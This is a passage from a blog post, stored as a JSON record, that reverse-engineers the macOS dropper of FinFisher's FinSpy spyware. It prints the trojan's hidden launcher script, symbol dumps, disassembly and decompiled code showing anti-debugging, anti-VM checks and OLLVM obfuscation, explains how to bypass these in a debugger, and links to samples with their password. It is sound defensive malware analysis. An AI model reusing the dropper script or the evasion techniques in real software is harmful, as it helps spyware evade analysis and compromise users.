{
    "id": "3adb2d2f-5ccb-41f6-a744-07bc331e7b5c",
    "created_at": "2023-01-12T14:59:17.831975Z",
    "updated_at": "2025-03-27T02:05:26.860807Z",
    "deleted_at": null,
    "sha1_hash": "89645f084c7ce164056fe829e0930789ccf19a2f",
    "title": "2020-09-26 - The Finfisher Tales, Chapter 1- The dropper",
    "authors": "",
    "file_creation_date": "2022-05-28T17:10:09Z",
    "file_modification_date": "2022-05-28T17:10:09Z",
    "file_size": 333427,
    "plain_text": "# The Finfisher Tales, Chapter 1: The dropper\n\n**reverse.put.as/2020/09/26/the-finfisher-tales-chapter-1/**\n\n## Posted on September 26, 2020 - @malware\n\n Amnesty International finally dropped the bomb and released a report about FinSpy spyware made by FinFisher Gmbh.\n\n The most interesting thing was the revelation of Mac and Linux versions, something that was missing from previous reports on this commercial malware (Kaspersky, Wikileaks).\n\n Their report summarizes the most important features but isn’t technically deep. This got me interested in verifying if FinSpy for Mac was any good malicious software or just the same kind of bullshit commercial malware like HackingTeam (they finally went kaput, oh so many crocodile tears!).\n\n A couple of years ago I wrote a series about HackingTeam Crisis malware, which they loved according to Phineas Fisher hacking and leaks so, it’s time to do the same to FinFisher and FinSpy. A big thanks to Amnesty Internation for pulling the trigger on this one.\n\n The report contains four macOS related hashes:\n\n Hash Content\n\n 80d6e71c54fb3d4a904637e4d56e108a8255036cbb4760493b142889e47b951f Dropper\n\n 37e749b79f4a24ead2868dffdb22c5034053615fed1166fdea05b4ca43b65c83 Encrypted ZIP payload\n\n b5304d70dfe832c5a830762f8abc5bc9c4c6431f8ecfe80a6ae37b9d4cb430fd Persistence Plist\n\n\n-----\n\n## Hash Content\n\n 4f3003dd2ed8dcb68133f95c14e28b168bd0f52e5ae9842f528d3f7866495cea Trojaned DMG\n\n You can download them here. Password is ‘clowns!’.\n\n There are two different versions in these files. The first three files belong to a apparently newer version extracted from Jabuka.app application, and the last one apparently an older version packaged in a trojaned application ( caglayan-macos.dmg ) used to infect targets. This post will be focused on the latter because it’s a complete package.\n\n The following is the list of files available in the DMG.\n\n\n-----\n\n```\n/Volumes/caglayan macos/\n├── .fseventsd\n│  └── fseventsd-uuid\n└── Install\\ Çağlayan.app\n  └── Contents\n    ├── Info.plist\n    ├── MacOS\n    │  ├── .log\n    │  │  └── ARA0848.app\n    │  │    └── Contents\n    │  │      ├── Info.plist\n    │  │      ├── MacOS\n    │  │      │  └── installer\n    │  │      ├── PkgInfo\n    │  │      └── Resources\n    │  │        ├── English.lproj\n    │  │        │  ├── InfoPlist.strings\n    │  │        │  └── MainMenu.nib\n    │  │        ├── data\n    │  │        └── res\n    │  ├── Install\\ Çağlayan\n    │  └── installer\n    ├── PkgInfo\n    ├── Resources\n    │  ├── Config.plist\n    │  ├── Çağlayan\n    │  │  └── Contents\n    │  │    ├── Info.plist\n    │  │    ├── MacOS\n    │  │    │  └── Çağlayan\n    │  │    ├── PkgInfo\n    │  │    ├── Resources\n    │  │    │  ├── DesktopReader.swf\n    │  │    │  ├── Icon.icns\n    │  │    │  ├── META-INF\n    │  │    │  │  ├── AIR\n    │  │    │  │  │  ├── application.xml\n    │  │    │  │  │  └── hash\n    │  │    │  │  └── signatures.xml\n    │  │    │  ├── assets\n    │  │    │  │  ├── LibraryLogo.png\n    │  │    │  │  ├── accent-map.json\n    │  │    │  │  ├── icons\n    │  │    │  │  │  ├── Icon-128.png\n    │  │    │  │  │  ├── Icon-16.png\n    │  │    │  │  │  ├── Icon-32.png\n    │  │    │  │  │  ├── Icon-48.png\n    │  │    │  │  │  └── Icon-desktop.png\n    │  │    │  │  └── info.xml\n    │  │    │  ├── mimetype\n    │  │    │  └── native-utils\n    │  │    │    └── sqlite3\n    │  │    └── _CodeSignature\n    │  │      └── CodeResources\n    │  ├── ErrorDialog.nib\n\n```\n\n-----\n\n```\n    │  ├ MainMenu.nib\n    │  └── NativeInstaller.icns\n    └── _CodeSignature\n      └── CodeResources\n22 directories, 36 files\n\n## Anything hidden inside MacOS folder is never a good sign. In this case we have the hidden\n.log folder that contains another application inside.\n\n We can have a look at Info.plist to find out which binary is going to be executed when a user opens this application. The field we are interested in is CFBundleExecutable . It points to Install Çağlayan . Assuming that the plist wasn’t tampered with, the field\nBuildMachineOSBuild tells us that the original application was built in Mountain Lion\n\n latest release. This version was released in 2013.\n\n```\n\n-----\n\n```\n<?xml version 1.0 encoding UTF 8 standalone no ?>\n<!DOCTYPE plist PUBLIC \"-//Apple//DTD PLIST 1.0//EN\"\n\"http://www.apple.com/DTDs/PropertyList-1.0.dtd\">\n<plist version=\"1.0\">\n  <dict>\n    <key>BuildMachineOSBuild</key>\n    <string>12F45</string>\n    <key>CFBundleAllowMixedLocalizations</key>\n    <true/>\n    <key>CFBundleDevelopmentRegion</key>\n    <string>English</string>\n    <key>CFBundleExecutable</key>\n    <string>Install Çağlayan</string>\n    <key>CFBundleIconFile</key>\n    <string>NativeInstaller.icns</string>\n    <key>CFBundleIdentifier</key>\n    <string>com.coverpage.bluedome.caglayan.desktop.installer</string>\n    <key>CFBundleInfoDictionaryVersion</key>\n    <string>6.0</string>\n    <key>CFBundlePackageType</key>\n    <string>APPL</string>\n    <key>CFBundleShortVersionString</key>\n    <string>2.0</string>\n    <key>DTCompiler</key>\n    <string>com.apple.compilers.llvm.clang.1_0</string>\n    <key>DTPlatformBuild</key>\n    <string>4H1503</string>\n    <key>DTPlatformVersion</key>\n    <string>GM</string>\n    <key>DTSDKBuild</key>\n    <string>10K549</string>\n    <key>DTSDKName</key>\n    <string>macosx10.6</string>\n    <key>DTXcode</key>\n    <string>0463</string>\n    <key>DTXcodeBuild</key>\n    <string>4H1503</string>\n    <key>LSMinimumSystemVersion</key>\n    <string>10.6</string>\n    <key>NSHumanReadableCopyright</key>\n    <string/>\n    <key>NSMainNibFile</key>\n    <string>MainMenu</string>\n    <key>NSPrincipalClass</key>\n    <string>NSApplication</string>\n  </dict>\n</plist>\n\n## The next step is to see what Install Çağlayan contains.\n$ file Install\\ Çağlayan \nInstall Çağlayan: Bourne-Again shell script text executable, UTF-8 Unicode text\n\n```\n\n-----\n\n## Normally we should expect a Mach-O executable instead of a shell script, so something fishy is going on. Let’s take a look at its contents.\n```\n$ cat Install\\ Çağlayan \n#!/bin/bash\nBASEDIR=\"$( cd \"$(dirname \"$0\")\" && pwd)\"\ncd \"$BASEDIR\"\nopen .log/ARA0848.app\nsleep 2\nrm Install\\ Çağlayan\nmv installer Install\\ Çağlayan\nrm -rf .log\n./Install\\ Çağlayan\nexit\n\n The script executes the hidden application, then replaces itself with the original application binary, and finally executes it to avoid suspicion by the user. This means that we should focus our attention on the installer binary inside ARA0848.app application (because it’s the binary that will be executed). The hidden application name ARA0848.app is different from Jabuka.app mentioned in Amnesty International report. The folder structure is the same and installer is described as the launcher/dropper.\n\n The following picture describes the installation process:\n\n```\n\n-----\n\n## The report discusses virtual machine detection and code obfuscation, so the next step is to load the installer binary into a disassembler (IDA in my case) and start reversing it.\n\n The first thing we can notice is that the binary wasn’t stripped because function names are available. Yeah I know, getting strip to work with Xcode is not straightforward! Also visible are Objective-C class/method names without obfuscation (some macOS adware families obfuscate the names with junk strings).\n\n\n-----\n\n```\n$ nm installer s __TEXT __text \n000000010000594b t +[GIFileOps baseAttributes]\n0000000100004c0c t +[GIFileOps copy:to:]\n0000000100004de3 t +[GIFileOps createDirectory:shouldDelete:]\n000000010000628b t +[GIFileOps loadAgent:]\n0000000100004f4d t +[GIFileOps move:to:]\n0000000100005128 t +[GIFileOps remove:]\n0000000100005254 t +[GIFileOps rename:to:]\n0000000100005f80 t +[GIFileOps setDataFileAttributes:]\n00000001000059c1 t +[GIFileOps setDirectoryAttributes:]\n0000000100005d44 t +[GIFileOps setExecutableFileAttributes:]\n00000001000061bc t +[GIFileOps setFile:withAttributes:]\n0000000100005737 t +[GIFileOps setStandardAttributes:]\n000000010000543f t +[GIFileOps setSuid:]\n00000001000063ae t +[GIFileOps unloadAgent:]\n00000001000064d1 t +[GIFileOps unloadKext]\n0000000100029ca9 t +[GIFileOps(Zip) unzip:to:]\n000000010000765c t +[GIPath agentName]\n000000010000767b t +[GIPath agentSource]\n0000000100007726 t +[GIPath agentTarget]\n0000000100007298 t +[GIPath compressedPayload]\n0000000100007522 t +[GIPath coreName]\n0000000100007541 t +[GIPath coreSource]\n00000001000075ec t +[GIPath coreTarget]\n00000001000065bd t +[GIPath executables]\n0000000100007378 t +[GIPath expandedMainBundle]\n0000000100007308 t +[GIPath expandedPayload]\n0000000100006cb2 t +[GIPath installationMap]\n00000001000070d2 t +[GIPath installer]\n00000001000073e8 t +[GIPath kextName]\n0000000100007407 t +[GIPath kextSource]\n00000001000074b2 t +[GIPath kextTarget]\n0000000100007940 t +[GIPath masterKeyDirSource]\n00000001000078d0 t +[GIPath masterKeyDirTarget]\n0000000100007142 t +[GIPath payload]\n0000000100007796 t +[GIPath supervisorName]\n00000001000077b5 t +[GIPath supervisorSource]\n0000000100007860 t +[GIPath supervisorTarget]\n0000000100006f2a t +[GIPath systemTemp]\n0000000100007062 t +[GIPath trampoline]\n00000001000071ed t +[GIPath updatePackage]\n0000000100027f49 t -[ZipArchive CloseZipFile2]\n000000010002762f t -[ZipArchive CreateZipFile2:Password:]\n00000001000274c3 t -[ZipArchive CreateZipFile2:]\n0000000100029b52 t -[ZipArchive Date1980]\n000000010002996e t -[ZipArchive OutputErrorMessage:]\n0000000100029a29 t -[ZipArchive OverWrite:]\n00000001000297ea t -[ZipArchive UnzipCloseFile]\n000000010002818a t -[ZipArchive UnzipFileTo:overWrite:]\n000000010002816d t -[ZipArchive UnzipOpenFile:Password:]\n000000010002800f t -[ZipArchive UnzipOpenFile:]\n000000010002764c t -[ZipArchive addFileToZip:newname:]\n0000000100027484 t -[ZipArchive dealloc]\n0000000100029c46 t -[ZipArchive delegate]\n0000000100027300 t -[ZipArchive init]\n\n```\n\n-----\n\n```\n0000000100029c8c t [ZipArchive setDelegate:]\n000000010000275c t -[appAppDelegate applicationDidFinishLaunching:]\n0000000100004884 t -[appAppDelegate askUserPermission:]\n0000000100003283 t -[appAppDelegate executeTrampoline]\n0000000100002b29 t -[appAppDelegate expandPayload]\n0000000100003581 t -[appAppDelegate installPayload]\n0000000100003e87 t -[appAppDelegate isAfterPatch]\n0000000100003658 t -[appAppDelegate launchNewStyle]\n000000010000384a t -[appAppDelegate launchOldStyle]\n0000000100002a41 t -[appAppDelegate removeOldResource]\n0000000100003c37 t -[appAppDelegate removeTraces]\n000000010002a781 t ___ARCLite__load\n000000010002aa1b t ___arclite_NSArray_objectAtIndexedSubscript\n000000010002aa95 t ___arclite_NSDictionary_objectForKeyedSubscript\n000000010002aa30 t ___arclite_NSMutableArray_setObject_atIndexedSubscript\n000000010002aaaa t ___arclite_NSMutableDictionary__setObject_forKeyedSubscript\n000000010002aad1 t ___arclite_NSMutableOrderedSet_setObject_atIndexedSubscript\n000000010002aabc t ___arclite_NSOrderedSet_objectAtIndexedSubscript\n000000010002b0bc t ___arclite_objc_autorelease\n000000010002aae3 t ___arclite_objc_autoreleasePoolPop\n000000010002ad6c t ___arclite_objc_autoreleasePoolPush\n000000010002b0f6 t ___arclite_objc_autoreleaseReturnValue\n000000010002b0a7 t ___arclite_objc_release\n000000010002b088 t ___arclite_objc_retain\n000000010002b0d1 t ___arclite_objc_retainAutorelease\n000000010002b10b t ___arclite_objc_retainAutoreleaseReturnValue\n000000010002b130 t ___arclite_objc_retainAutoreleasedReturnValue\n000000010002b09d t ___arclite_objc_retainBlock\n000000010002b145 t ___arclite_objc_storeStrong\n000000010002af14 t ___arclite_object_copy\n000000010002ad85 t ___arclite_object_setInstanceVariable\n000000010002ade7 t ___arclite_object_setIvar\n0000000100000000 T __mh_execute_header\n000000010001e6d2 t _add_data_in_datablock\n000000010002a9eb t _add_image_hook_ARC\n000000010002aa03 t _add_image_hook_GC\n00000001000270a3 t _allocate_new_datablock\n00000001000016e0 t _deny_ptrace\n00000001000081d1 t _fclose_file_func\n00000001000081de t _ferror_file_func\n0000000100008226 t _fill_fopen_filefunc\n00000001000079b0 t _fopen_file_func\n0000000100007e74 t _fread_file_func\n0000000100007f02 t _fseek_file_func\n0000000100007ef5 t _ftell_file_func\n0000000100007eda t _fwrite_file_func\n0000000100026f19 t _init_keys\n000000010000174f t _main\n000000010002a766 T _objc_retainedObject\n000000010002a76f T _objc_unretainedObject\n000000010002a778 T _objc_unretainedPointer\n000000010002aaf5 t _patch_lazy_pointers\n000000010000fab0 t _strcmpcasenosensitive_internal\n00000001000123b5 t _unzClose\n0000000100012549 t _unzCloseCurrentFile\n\n```\n\n-----\n\n```\n0000000100012b6f t _unzGetCurrentFileInfo\n000000010001525e t _unzGetFilePos\n000000010001a5df t _unzGetGlobalComment\n0000000100012adc t _unzGetGlobalInfo\n000000010001a111 t _unzGetLocalExtrafield\n000000010001aab5 t _unzGetOffset\n00000001000154f3 t _unzGoToFilePos\n0000000100012296 t _unzGoToFirstFile\n00000001000147be t _unzGoToNextFile\n0000000100014b6b t _unzLocateFile\n00000001000123a9 t _unzOpen\n0000000100010128 t _unzOpen2\n00000001000189cc t _unzOpenCurrentFile\n0000000100018a36 t _unzOpenCurrentFile2\n0000000100015692 t _unzOpenCurrentFile3\n0000000100018a20 t _unzOpenCurrentFilePassword\n0000000100018a43 t _unzReadCurrentFile\n0000000100008280 t _unzRepair\n000000010001ad39 t _unzSetOffset\n000000010000f921 t _unzStringFileNameCompare\n0000000100019efa t _unzeof\n000000010001789d t _unzlocal_CheckCurrentFileCoherencyHeader\n0000000100012ba9 t _unzlocal_GetCurrentFileInfoInternal\n000000010001ae36 t _unzlocal_getByte\n0000000100011d6c t _unzlocal_getLong\n0000000100011f96 t _unzlocal_getShort\n0000000100019d43 t _unztell\n0000000100025a9b t _zipClose\n0000000100023296 t _zipCloseFileInZip\n0000000100024e85 t _zipCloseFileInZipRaw\n0000000100024bda t _zipFlushWriteBuffer\n000000010001ef74 t _zipOpen\n000000010001b00b t _zipOpen2\n0000000100023f7c t _zipOpenNewFileInZip\n0000000100023f11 t _zipOpenNewFileInZip2\n000000010001efd2 t _zipOpenNewFileInZip3\n000000010002404a t _zipWriteInFileInZip\n00000001000232a4 t _ziplocal_TmzDateToDosDate\n0000000100027110 t _ziplocal_getByte\n000000010001e082 t _ziplocal_getLong\n000000010001e4ae t _ziplocal_getShort\n0000000100023997 t _ziplocal_putValue\n000000010002351c t _ziplocal_putValue_inmemory\n00000001000016a4 T start\n\n## Something that should always be verified is the existence of any constructors/destructors and Objective-C load methods. These are executed before main and we need to take a look at their contents. They can be used for all kinds of tricks before code starts executing at\nmain .\n\n In this case there aren’t any so we can focus instead on main . The start symbol is called first but the only thing important happening there is the call to main, so we don’t need to worry about it.\n\n```\n\n-----\n\n## A small peek of main follows:\n```\n__text:10000174F  push  rbp\n__text:100001750  mov   rbp, rsp\n__text:100001753  push  r15\n__text:100001755  push  r14\n__text:100001757  push  r13\n__text:100001759  push  r12\n__text:10000175B  push  rbx\n__text:10000175C  sub   rsp, 398h\n__text:100001763  mov   r14, rsi\n__text:100001766  mov   r15d, edi\n__text:100001769  mov   rax, cs:___stack_chk_guard_ptr\n__text:100001770  mov   rax, [rax]\n__text:100001773  mov   [rbp+var_30], rax\n__text:100001777  call  _objc_autoreleasePoolPush\n__text:10000177C  mov   [rbp+context], rax\n__text:100001783  call  _deny_ptrace ; <------------ HERE\n__text:100001788  mov   [rbp+var_40], 288h\n__text:100001790  lea   rbx, [rbp+var_2C8]\n__text:100001797  mov   esi, 288h\n__text:10000179C  mov   rdi, rbx\n__text:10000179F  call  ___bzero\n__text:1000017A4  mov   dword ptr [rbp+__size], 1\n__text:1000017AE  mov   dword ptr [rbp+__size+4], 0Eh\n__text:1000017B8  mov   [rbp+var_2D8], 1\n__text:1000017C2  call  _getpid\n__text:1000017C7  mov   [rbp+var_2D4], eax\n__text:1000017CD  lea   rdi, [rbp+__size] ; int *\n__text:1000017D4  lea   rcx, [rbp+var_40] ; size_t *\n__text:1000017D8  mov   esi, 4     ; u_int\n__text:1000017DD  xor   r8d, r8d    ; void *\n__text:1000017E0  xor   r9d, r9d    ; size_t\n__text:1000017E3  mov   rdx, rbx    ; void *\n__text:1000017E6  call  _sysctl ; <----------------- HERE\n__text:1000017EB  mov   [rbp+var_34], eax\n__text:1000017EE  mov   r8d, [rbp+var_2A8]\n__text:1000017F5  shr   r8d, 0Bh ; <---------------__text:1000017F9  and   r8d, 1\n\n One of the calls is explicit on its intentions, to execute the ptrace anti-debugging trick.\n\n PT_DENY_ATTACH\n\n This request is the other operation used by the traced process; it allows a process that is not currently being traced to deny future traces by its parent. All other arguments are ignored. If the process is currently being traced, it will exit with the exit status of ENOTSUP; otherwise, it sets a flag that denies future traces. An attempt by the parent to trace a process which has set this flag will result in a segmentation violation in the parent.\n\n```\n\n-----\n\n## The call to sysctl is also another anti-debugging trick based on Apple s AmIBeingDebugged example. Pretty normal, boring stuff, easy to bypass!\n\n To bypass _deny_ptrace we can set a breakpoint at address 0x100001783 and skip the call by setting the instruction pointer to the next address 0x100001788 . The command\n\n### skip exists in lldbinit for this purpose. A kernel extension like Onyx The Black Cat can\n## take care of this transparently or we can just breakpoint into ptrace symbol and return the right value to fool the call. Skipping the call is just easier in this case.\n\n To bypass the sysctl anti-debugging we just need to modify the return data. The debugger is detected under the following condition:\n```\n#define P_TRACED  0x00000800 /* Debugged process being traced */\nif ((info.kp_proc.p_flag & P_TRACED) != 0)\n{\n  printf(\"ALERT: Debugger is found !!!!\\n\");\n}\n\n If we breakpoint at address 0x1000017F5 we can simply remove 0x800 from whatever value was moved to r8 at previous instruction. This is what the code is doing, verifying if bit 11 is set. Once again, there are different ways to attack this from the kernel or from\nsysctl symbol. The breakpoint will work fine since we can script all this in lldb .\n\n After the sysctl call we observe some weird code:\n\n```\n\n-----\n\n```\n__text:1000017E6  call  _sysctl\n__text:1000017EB  mov   [rbp+var_34], eax\n__text:1000017EE  mov   r8d, [rbp+var_2A8] ; info.kp_proc.p_flag (int)\n__text:1000017F5  shr   r8d, 0Bh\n__text:1000017F9  and   r8d, 1\n__text:1000017FD  mov   edi, 470C6D79h\n__text:100001802  mov   edx, 6A7B7BCBh\n__text:100001807  jmp   short loc_100001810\n__text:100001809 ; -------------------------------------------------------------------------__text:100001809\n__text:100001809 loc_100001809:        ; CODE XREF: _main+EE↓j\n__text:100001809  mov   esi, eax\n__text:10000180B  mov   edi, 0A25B8AE8h\n__text:100001810\n__text:100001810 loc_100001810:        ; CODE XREF: _main+B8↑j\n__text:100001810                ; _main+106↓j\n__text:100001810  mov   ecx, esi\n__text:100001812  jmp   short loc_100001820\n__text:100001814 ; -------------------------------------------------------------------------__text:100001814\n__text:100001814 loc_100001814:        ; CODE XREF: _main+E6↓j\n__text:100001814  cmp   [rbp+var_34], 0\n__text:100001818  mov   edi, 0D4A840A1h\n__text:10000181D  cmovnz edi, edx\n__text:100001820\n__text:100001820 loc_100001820:        ; CODE XREF: _main+C3↑j\n__text:100001820                ; _main+DE↓j ...\n__text:100001820  mov   ebx, edi\n__text:100001822  mov   edi, 7BDEBDB0h\n__text:100001827  cmp   ebx, 6A7B7BCBh\n__text:10000182D  jz   short loc_100001820\n__text:10000182F  cmp   ebx, 470C6D79h\n__text:100001835  jz   short loc_100001814\n__text:100001837  cmp   ebx, 7BDEBDB0h\n__text:10000183D  jz   short loc_100001809\n__text:10000183F  mov   edi, 2F10CD8Bh\n__text:100001844  cmp   ebx, 0A25B8AE8h\n__text:10000184A  jz   short loc_100001820\n__text:10000184C  cmp   ebx, 0D4A840A1h\n__text:100001852  mov   esi, r8d\n__text:100001855  jz   short loc_100001810\n__text:100001857  cmp   ebx, 2F10CD8Bh\n__text:10000185D  jnz   short loc_10000188A\n__text:10000185F  mov   [rbp+argc], r15d\n__text:100001866  mov   [rbp+argv], r14\n__text:10000186D  mov   [rbp+var_2E8], ecx\n__text:100001873  mov   eax, 0AA554355h\n__text:100001878  mov   [rbp+var_300], 0\n__text:100001882  mov   [rbp+var_2FC], ecx\n__text:100001888  jmp   short loc_100001891\n\n```\n\n-----\n\n## This code doesn t look normal and executing anything useful. It is the result of LLVM- obfuscator. In this case the control flow appears to be obfuscated. After the r8 test we can’t clearly see the test condition that we expect - we can just follow a bunch of jumps based on some weird values. This appears to be LLVM-obfuscator’s Bogus Control Flow feature.\n\n This method modifies a function call graph by adding a basic block before the current basic block. This new basic block contains an opaque predicate and then makes a conditional jump to the original basic block.\n\n The original basic block is also cloned and filled up with junk instructions chosen at random.\n\n QuarksLab has a very interesting post about this obfuscator: Deobfuscation: recovering an OLLVM-protected program.\n\n The function graph is too long to display here but it’s even easier to visualise the obfuscator with the decompiler:\n\n\n-----\n\n```\n context objc_autoreleasePoolPush();\n deny_ptrace();\n v53 = 648LL;\n __bzero(v51, 648LL);\n __size = 0xE00000001LL;\n v49 = 1;\n v50 = getpid();\n v5 = 4;\n // amIBeingDebugged\n v6 = sysctl((int *)&__size, 4u, v51, &v53, 0LL, 0LL);\n v54 = v6;\n v7 = 0x470C6D79;\n v8 = 0x6A7B7BCBLL;\n do\n {\nLABEL_3:\n  v9 = v5;\n  do {\n   while ( 1 ) {\n    do {\n     v10 = v7;\n     v7 = 0x7BDEBDB0;\n    }\n    while ( v10 == 0x6A7B7BCB );\n    if ( v10 != 0x470C6D79 )\n     break;\n    v7 = 0xD4A840A1;\n    if ( v54 )\n     v7 = 0x6A7B7BCB;\n   }\n   if ( v10 == 0x7BDEBDB0 ) {\n    v5 = v6;\n    v7 = 0xA25B8AE8;\n    goto LABEL_3;\n   }\n   v7 = 0x2F10CD8B;\n  }\n  while ( v10 == 0xA25B8AE8 );\n  // the P_TRACED check\n  // info.kp_proc.p_flag\n  v5 = (v52 >> 11) & 1;\n }\n while ( v10 == 0xD4A840A1 );\n argca = argc;\n argva = argv;\n v46 = v9;\n v11 = 0xAA554355;\n v41 = 0;\n v42 = v9;\n\n## Just visually we can see that the do while blocks are pretty weird and the checks don’t seem useful at all. The biggest issue of this obfuscation is that to step and debug the control flow is annoying and takes time.\n\n```\n\n-----\n\n## We can step every instruction in the debugger, which can be slow (although just the first time since then we can set breakpoints for next sessions). To trace the code paths we can use tools such as PIN and Lighthouse. All the bogus flow would still be traced and flagged but we could visualise which areas were executed and which weren’t.\n\n But there is no need to bring bazookas to a knife fight. Instead I simplified and just used bruteforce. I always like to look around the code to have a general feeling before deep diving into it (I’m a fan of +ORC zen cracking thing). So I saw the code basic blocks and could see the string references to virtual machine detection tricks described by Amnesty report. Instead of tracing the control flow I could just gather all those basic blocks and breakpoint all of them and hope for the best. Using the first anti-vm detection as an example:\n```\n__text:100001B45 loc_100001B45:           ; CODE XREF: _main+1B9↑j\n__text:100001B45  cmp   eax, 4BB9C77Ch\n__text:100001B4A  jnz   loc_100001891\n__text:100001B50  xor   esi, esi        ; void *\n__text:100001B52  xor   ecx, ecx        ; void *\n__text:100001B54  xor   r8d, r8d        ; size_t\n__text:100001B57  lea   rbx, aHwModel      ; \"hw.model\"\n__text:100001B5E  mov   rdi, rbx        ; char *\n__text:100001B61  lea   r15, [rbp+__size]\n__text:100001B68  mov   rdx, r15        ; size_t *\n__text:100001B6B  call  _sysctlbyname      ; size_t len = 0;\n\n The first two instructions of this block are junk, so we can set the breakpoint at address\n0x100001B50 . When this check is finally going to be executed the debugger will\n\n breakpoint and we avoided tracing through all the bogus control flow. The only problem is to automate the breakpoint addresses for the basic blocks we are interested in. I just did it by hand since there weren’t that many candidates.\n\n Nevertheless as I mentioned before, the decompiler makes this even easier. I’m still not a frequent user of the decompiler (wrongly so) and that’s the reason why I attacked this issue with the breakpoint bruteforce method. Later on I used the decompiler and this makes it so much easier to find where the interesting code is. The following listing shows the full obfuscation in executeTrampoline Objective-C method:\n\n```\n\n-----\n\n```\nvoid __cdecl [appAppDelegate executeTrampoline](appAppDelegate self, SEL a2)\n{\n int i; // eax\n __int64 v3; // [rsp+0h] [rbp-40h] BYREF\n id *v4; // [rsp+8h] [rbp-38h]\n bool v5; // [rsp+16h] [rbp-2Ah]\n bool v6; // [rsp+17h] [rbp-29h]\n for ( i = -1314525355; ; i = -860919120 ) {\n  while ( 1 ) {\n   while ( 1 ) {\n    while ( 1 ) {\n     while ( 1 ) {\n      while ( 1 ) {\n       while ( 1 ) {\n        while ( 1 ) {\n         while ( 1 ) {\n          while ( 1 ) {\n           while ( 1 ) {\n            while ( 1 ) {\n             while ( 1 ) {\n              while ( 1 ) {\n               while ( 1 ) {\n                while ( 1 ) {\n                 while ( 1 ) {\n                  while ( i > 1906374694 ) {\n                   i = -378289692;\n                   if ( v5 )\n                    i = -166979571;\n                  }\n                  if ( i <= 1362875871 )\n                   break;\n                  i = -653958391;\n                  if ( v6 )\n                   i = 349463466;\n                 }\n                 if ( i > -1680978437 )\n                  break;\n                 i = -1260767775;\n                }\n                if ( i > -1490852160 )\n                 break;\n                i = -842796370;\n               }\n               if ( i > -1260767776 )\n                break;\n               i = -506855829;\n              }\n              if ( i > -1178212413 )\n               break;\n              v6 = (unsigned __int8)objc_msgSend(*v4,\n\"launchNewStyle\") == 0;\n              i = 1362875872;\n             }\n             if ( i <= 428753874 )\n\n```\n\n-----\n\n```\n              break;\n             i = 376588111;\n            }\n            if ( i <= 376588110 )\n             break;\n            objc_msgSend(*v4, \"launchOldStyle\");\n            i = -653958391;\n           }\n           if ( i <= 349463465 )\n            break;\n           i = -1680978436;\n          }\n          if ( i > -1167397111 )\n           break;\nLABEL_30:\n          i = 161326308;\n         }\n         if ( i > -860919121 )\n          break;\n         i = -1946496017;\n        }\n        if ( i <= -842796371 ) {\n         objc_msgSend(*v4, \"launchOldStyle\");\n         goto LABEL_30;\n        }\n        if ( i > -653958392 )\n         break;\n        i = 428753875;\n       }\n       if ( i > -506855830 )\n        break;\n       i = -434592465;\n      }\n      if ( i > -434592466 )\n       break;\n      v4 = (id *)(&v3 - 2);\n      *(&v3 - 2) = (__int64)self;\n      v5 = (unsigned __int8)objc_msgSend(*v4, \"isAfterPatch\") == 1;\n      i = 1906374695;\n     }\n     if ( i > -378289693 )\n      break;\n     i = -1178212412;\n    }\n    if ( i > -166979572 )\n     break;\n    i = 163091173;\n   }\n   if ( i != -166979571 )\n    break;\n   i = -1167397110;\n  }\n  if ( i != 163091173 )\n   break;\n\n```\n\n-----\n\n```\n }\n}\n\n## What we can clearly see in this code is that we are just interested in all the objc_msgSend calls, while the rest of the code is just junk. To debug this function we just need to breakpoint those basic blocks and wait for the debugger to hit them, bypassing all the junk code. This should be possible to automate so we can pass this information from the disassembler to the debugger and make the whole process faster.\n\n After breakpointing the interesting basic blocks I finally reached to the first virtual machine detection attempt. The code queries the hardware model via sysctl and then tries to match known virtualization software. It’s a variation of this sample code:\n#include <stdlib.h>\n#include <stdio.h>\n#include <sys/types.h>\n#include <sys/sysctl.h>\nsize_t len = 0;\nsysctlbyname(\"hw.model\", NULL, &len, NULL, 0);\nif (len) {\n  char *model = malloc(len*sizeof(char));\n  sysctlbyname(\"hw.model\", model, &len, NULL, 0);\n  printf(\"%s\\n\", model);\n  free(model);\n}\n\n I use VMware Fusion so my model will be VMware7,1 . Then the code checks if the model string starts with vmware, parallels, or virtualbox . To bypass this check we can simply modify the model value to something else that doesn’t match those strings such as\nMacOS7,1 or just modify the first byte.\n__text:100001B6B  call  _sysctlbyname  ; find out the size of model string\n__text:100001B70  mov   rdi, [rbp+__size]\n__text:100001B77  call  _malloc     ; allocate space for char *model\n__text:100001B7C  mov   r14, rax    ; we want this address so we can modify\nlater on\n__text:100001B7F  xor   ecx, ecx    \n__text:100001B81  xor   r8d, r8d    \n__text:100001B84  mov   rdi, rbx    \n__text:100001B87  mov   rsi, r14    ; the model buffer\n__text:100001B8A  mov   rdx, r15    \n__text:100001B8D  call  _sysctlbyname  ; just change the buffer content after\nthe call\n__text:100001B92  mov   rdi, cs:classRef_NSString\n\n In this case we need to set a breakpoint at address 0x100001B7C or 0x100001B87 so we know the address of the buffer. Then we set another breakpoint after the second call to\nsysctlbyname at address 0x100001B92 . There we modify the buffer contents and\n\n bypass the first virtual machine detection. This could also be automated with a kernel extension or hooking sysctlbyname\n\n```\n\n-----\n\n## There is a second virtual machine detection attempt, this one described in Amnesty report. It uses the system_profiler system command to find the hardware manufacturer. Executing the command on a virtual machine:\n```\n$ system_profiler SPUSBDataType | egrep -i \"Manufacturer:\n(parallels|vmware|virtualbox)\"\n     Manufacturer: VMware, Inc.\n       Manufacturer: VMware\n       Manufacturer: VMware\n     Manufacturer: VMware\n\n This is the detection code decompilation output:\nv26 = objc_msgSend(&OBJC_CLASS___NSTask, \"alloc\");\nv37 = objc_msgSend(v26, \"init\");\nobjc_msgSend(v37, \"setLaunchPath:\", CFSTR(\"/bin/sh\"));\nv27 = objc_msgSend(\n    &OBJC_CLASS___NSString,\n    \"stringWithFormat:\",\n    CFSTR(\"%@\"),\n    CFSTR(\"system_profiler SPUSBDataType | egrep -i \\\"Manufacturer:\n(parallels|vmware|virtualbox)\\\"\"));\nv28 = objc_retainAutoreleasedReturnValue(v27);\nv29 = objc_msgSend(&OBJC_CLASS___NSArray, \"arrayWithObjects:\", CFSTR(\"-c\"), v28,\n0LL);\nv36 = objc_retainAutoreleasedReturnValue(v29);\nobjc_release(v28);\nobjc_msgSend(v37, \"setArguments:\", v36);\nv30 = objc_msgSend(&OBJC_CLASS___NSPipe, \"pipe\");\nv35 = objc_retainAutoreleasedReturnValue(v30);\nobjc_msgSend(v37, \"setStandardOutput:\", v35);\nv31 = objc_msgSend(v35, \"fileHandleForReading\");\nv38 = objc_retainAutoreleasedReturnValue(v31);\nobjc_msgSend(v37, 